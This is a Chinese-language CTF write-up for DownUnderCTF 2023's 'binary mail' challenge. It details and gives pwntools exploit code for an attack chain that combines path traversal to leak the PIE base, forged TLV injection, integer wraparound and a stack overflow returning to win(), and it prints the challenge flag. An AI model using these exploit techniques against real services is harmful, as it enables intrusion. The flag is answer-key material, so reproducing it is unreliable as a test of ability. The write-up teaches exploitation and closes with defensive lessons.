# DownUnderCTF 2023 binary mail Writeup

## 题目简述

邮件服务使用自定义 TLV 协议，把每个用户的数据直接保存到 `/tmp/<username>`。利用链需要组合路径穿越、错误消息泄漏、邮件字段长度错配和 64 位整数溢出，最终在 `view_mail` 中造成栈溢出并返回 `win`。

## 解题过程

TLV 头由 4 字节 tag 和 8 字节长度组成：

```python
def tlv(tag, value):
    return p32(tag) + p64(len(value)) + value
```

第一步，用用户名 `../proc/self/maps` 访问 `/tmp/../proc/self/maps`。认证函数把文件开头 12 字节误当成 TLV 头；tag 和长度不合法时，错误消息会以十进制打印这两个整数。按小端重新打包即可还原 `/proc/self/maps` 的前 12 个 ASCII 字节，从而得到 PIE 基址。

第二步，注册短用户 `u1` 和较长的发送者：

```python
u1 = b"u1"
u2 = b"u2" + p32(7) + p64(2**64 - 1)
```

`send_mail` 写 `TAG_STR_FROM` 时，把收件人长度写进头部，却实际写入完整发送者用户名。发给 `u1` 后，解析器只把开头 `u1` 当作 From 内容，紧随其后的 12 字节正好被解释成伪造的：

```text
tag = TAG_STR_MESSAGE = 7
len = 0xffffffffffffffff
```

第三步，`view_mail` 检查 `(t1 + t2) >= USERPASS_LEN + MESSAGE_LEN`。此时 `t1=2`、`t2=2^64-1`，无符号加法回绕为 1，检查被绕过。随后 `fread` 按巨大长度向栈缓冲区读取，实际会一直读到用户文件 EOF。

先发一封约 800 字节邮件，再追加包含 padding、对齐用 `ret` 和 `win` 地址的第二封邮件，使文件中伪造 Message 后的总数据越过保存返回地址：

```python
send_mail(u2, b"x", u1, b"X" * 800)
payload = cyclic(340) + p64(pie_base + ret_offset) + p64(pie_base + win_offset)
send_mail(u2, b"x", u1, payload)
view_mail(u1, b"x")
```

`view_mail` 返回时进入 `win()`，输出：

```text
DUCTF{y0uv3_g0t_ma1l_and_1ts_4_flag_cada60be8ab71a}
```

## 方法总结

这道题不是单一溢出点：路径穿越解决 PIE，From 长度错配在磁盘文件中注入伪造 TLV，整数回绕绕过长度检查，最后才形成栈溢出。二进制协议应统一验证长度、检查加法溢出，并禁止把未经规范化的用户名拼接为文件路径。
